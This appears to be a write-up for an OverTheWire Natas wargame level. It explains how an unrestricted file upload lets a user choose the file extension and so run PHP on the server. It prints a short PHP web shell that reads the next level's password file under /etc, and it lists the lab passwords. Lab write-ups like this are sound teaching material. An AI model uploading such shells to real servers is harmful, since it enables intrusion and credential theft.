# Level 11 → Level 12

## Details
Username: `natas12`<br />
Password: `YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG`<br />
URL:      http://natas12.natas.labs.overthewire.org

## Solution
<img src="./0.png"></img>

If we look at the source code, we will find that there is a parameter called **filename**, whose extension is appended to a new file in the **random_string.ext** format. where **ext** is the extension that came from the client. This file will contain the contents of the file that came from the client.

<img src="./1.png"></img>

<img src="./2.png"></img>

<img src="./3.png"></img>

<img src="./4.png"></img>

So, `$target_path` is the **random_string.ext**. That is, the client can control the file type that will create on the server. But, what will happen with this file later?

For the purpose of an example, we will create a small jpg file on our local computer (there is a correctness check for the size...) and upload it:

This is the picture for uploading: <img src="./little_JPEG.jpg"></img><br />
And now we will upload it:

<img src="./5.png"></img>

<img src="./6.png"></img>

**random_string.ext**:
<img src="./7.png"></img>

<img src="./8.png"></img>

That is, after a file is created with the content that the user uploaded, a get http request is made to it. Thanks to this:

<img src="./9.png"></img>

If so, we can generate a php file and upload it. When a GET HTTP query is made, a code is run for it. Because that's how the web works... let's do this:

Copy & Paste the next code:
```php
# get_password.php
<?php
echo shell_exec("cat /etc/natas_webpass/natas13");
?>
```

<img src="./10.png"></img>

<img src="./11.png"></img>

<img src="./12.png"></img>

## Password for the next level:
```
lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
```
